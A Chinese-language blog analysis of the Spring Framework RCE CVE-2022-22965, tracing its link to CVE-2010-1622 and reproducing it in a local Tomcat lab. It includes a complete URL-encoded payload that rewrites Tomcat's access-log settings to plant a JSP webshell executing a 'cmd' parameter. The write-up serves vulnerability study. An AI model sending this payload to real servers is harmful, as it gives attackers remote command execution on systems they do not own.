# 浅析SpringFramework Core RCE

CVE-2022-22965

***@springtime***

## 0x00 前言

​	这几天比较火的Spring框架漏洞，不少人说是“堪称log4j的核弹级漏洞”；口说无凭，正好到周末来看一看。

![image-20220403161149537](C:\Users\17762\AppData\Roaming\Typora\typora-user-images\image-20220403161149537.png)

## 0x01 漏洞条件与环境配置

漏洞有如下几个条件：

- JDK version >= 9
- Spring Framework 5.3.0 到 5.3.17，5.2.0 到 5.2.19 以及更早的版本
- 使用org.springframework.beans包
- Controller使用了不安全的表单绑定，例如POJO
- war打包并部署

复现环境我使用的是github上构建好的war包，本机tomcat9+JDK11进行本地调试。

环境：https://github.com/p1n93r/spring-rce-war

## 0x02 前置知识

​	今天了解到其实CVE-2022-22965的漏洞形式并不新颖，反而和十几年前的CVE-2010-1622有着密切的联系，我们先大致了解一下CVE-2010-1622吧。

### CVE-2010-1622

​	当我们在Spring MVC框架中使用了不安全参数绑定功能，攻击者可以传入特定参数修改类加载器的属性，假如后端实现的POJO中存在class类型的属性，那么我们就可以通过class.getClass().getClassLoader()的方式来获取类加载器，可以理解为通过反射的方式获取ClassLoader，但前提是POJO中有class属性。

**如果听起来比较吃力的话，这里有一些简单的解释：**

> 1.什么是POJO？
>
> ​	POJO全称是Plain Old Java Object，即普通java对象，众所周知由于Java的继承、接口、多态等属性导致了java类有些臃肿繁杂，而POJO就是“没有从任何类继承、也没有实现任何接口，更没有被其它框架侵入的java对象”。简单讲POJO就是更简单、纯洁的java对象。
>
> 2.什么是JavaBean？
>
> ​	JavaBean就是一种POJO，他拥有如下规则:
>
> - 访问级别—要求属性是私有的，并暴露公开getter和setter方法。
> - 方法名–getter和setter遵循getX和setX约定。
> - 默认构造函数–必须存在无参数构造函数，以便在不提供参数的情况下创建实例
>
> 3.什么是参数绑定？
>
> ~~~java
> /**举个例子**/
>   @RequestMapping("testParam")
>   public String testParam(String username,String password){
>     System.out.println("用户名: " + username);
>     System.out.println("密码: " + password);
>     return "params";
>   }
> ~~~
>
> ​	我们写入以上路由在提交参数的时候添加username=admin&password=admin就可以将这两个参数值绑定到后台controller。

​	当我们获取到ClassLoader之后，就可以通过setter和getter去修改类中的关键属性，比如在低版本SpringFramework中就有一个特别的ClassLoader：org.apache.catalina.loader.ParallelWebappClassLoader；它保存了tomcat相关的一些全局配置属性，那么我们就可以通过 *.getClass().getClassLoader().getXX()的方式最终构造出来class.classLoader.xx的利用链。

### CVE-2022-22965---祸起Module类

实际上，CVE-2022-22965是CVE-2010-1622的bypass，当初官方修复CVE-2010-1622的做法是在用户输入之后假如一层判断，如果用户输入的class并尝试获取classLoader的时候就会直接pass。

但是后来JDK9+的版本中class对象多了一个Module类，而Module类中也有classLoader，这就造成了bypass。

**当然前提是得有class！这个在下面的调试过程中会提到。**

​	如果学习过struts2-s20系列的漏洞应该知道，tomcat8+下有一个特别的context：class.classLoader.resources.context ，它包含着多个属性，其中有一种利用姿势就是我们可以通过修改以下几个属性，他们的默认值如下：

~~~
class.classLoader.resources.context.parent.pipeline.first.directory =logs
class.classLoader.resources.context.parent.pipeline.first.prefix =localhost_access_log
class.classLoader.resources.context.parent.pipeline.first.suffix = .txt
class.classLoader.resources.context.parent.pipeline.first.fileDateFormat =.yyyy-mm-dd
~~~

这几种属性规定了日志的形式，我们将其修改成

~~~
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{xxx}i
class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT
class.module.classLoader.resources.context.parent.pipeline.first.prefix=springtime
class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
~~~

然后传入就可以在web根目录下写入后缀为jsp的文件，有些类似于日志写马的操作，但明显这种操作自由度更高。设置完日志后我们传入任意参数只要包含恶意代码就可以完成写入webshell的操作。

## 0x03 调试与复现

### 调试

调试的过程也很直接，我们跟踪参数绑定的流程即可。index路由规定我们传入evalBean，evalBean长这样：

![image-20220403112021564](C:\Users\17762\AppData\Roaming\Typora\typora-user-images\image-20220403112021564.png)

有两个变量一个name一个commonBean，commonBean长这样：

![image-20220403112708339](C:\Users\17762\AppData\Roaming\Typora\typora-user-images\image-20220403112708339.png)

都是很标准的javaBean。

​	首先结合前面的分析，我们要确定一个目标，那就是**Spring在参数绑定的过程中，会不会出现一个class可控？**很明显我们写的spring MVC是很平常的写法，也符合很多人的代码习惯，当然没有哪个傻瓜会在后台绑定一个class，但是这就意味着我们的spring是安全的吗？**在我们打上断点Debug参数绑定的流程的时候，会发现神奇的一幕出现了：**

![image-20220403114216389](C:\Users\17762\AppData\Roaming\Typora\typora-user-images\image-20220403114216389.png)

​	**propertyDescriptorCache中多出了class！**按理来讲应该只有name和commonBean才对，因为我们的javaBean中只有这两个变量。至于为什么多出来一个class，我也不知道(菜)o(*￣▽￣* )o 。

​	我们传入一个payload并继续跟踪：

~~~
/index?class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp
~~~

![image-20220403115945875](C:\Users\17762\AppData\Roaming\Typora\typora-user-images\image-20220403115945875.png)

来到了getModule，再跟踪

![image-20220403120134318](C:\Users\17762\AppData\Roaming\Typora\typora-user-images\image-20220403120134318.png)

这里doBind就实现了参数覆盖，后面的过程就不继续跟了，修改完日志配置后就可以写入木马。

### 复现

按照我们刚才讲的思路进行复现，环境已经帮我们搭建好，使用了SpringBean，项目结构如下：

![image-20220402224753005](C:\Users\17762\AppData\Roaming\Typora\typora-user-images\image-20220402224753005.png)

我们首先进行参数绑定去变量覆盖，传入以下payload：

~~~
//借用了一下GitHub上的payload
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=springtime&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
~~~

构造如下请求并发送：

![image-20220403154320382](C:\Users\17762\AppData\Roaming\Typora\typora-user-images\image-20220403154320382.png)

> ​	注意别忘记headers的几个字段，至于为什么要添加headers，那是因为tomcat的一些特性，比如我们利用tomcat写入一些特殊字符例如尖括号 <>或者敏感类的时候会出现解析的错误，因此我们要分成两部分利用占位符来对webshell进行填充。

![image-20220403154723881](C:\Users\17762\AppData\Roaming\Typora\typora-user-images\image-20220403154723881.png)

成功写入，然后访问。

![image-20220403154839052](C:\Users\17762\AppData\Roaming\Typora\typora-user-images\image-20220403154839052.png)

搞定。

## 0x04 总结

​	分析完之后可以发现这个洞确实是有分量的，原因就在于参数绑定cache中多出的一个class引用（我想了一下应该不是凭空多出的，而是传入EvalBean的问题）加上JDK9+中多出的Module类，这就造成了我们能获取到ClassLoader最后修改日志写入webshell。严重确实挺严重，因为漏洞的触发是基于正常的代码习惯，很多人都会这么写后端；但是我认为和log4j还是没法比的。

嫌搭环境麻烦不想本地复现的同学可以去

vulfocus：http://vulfocus.io/

vulhub：https://github.com/vulhub/vulhub/tree/master/spring/CVE-2022-22965

## 参考

http://rui0.cn/archives/1158

https://cloud.tencent.com/developer/article/1035297
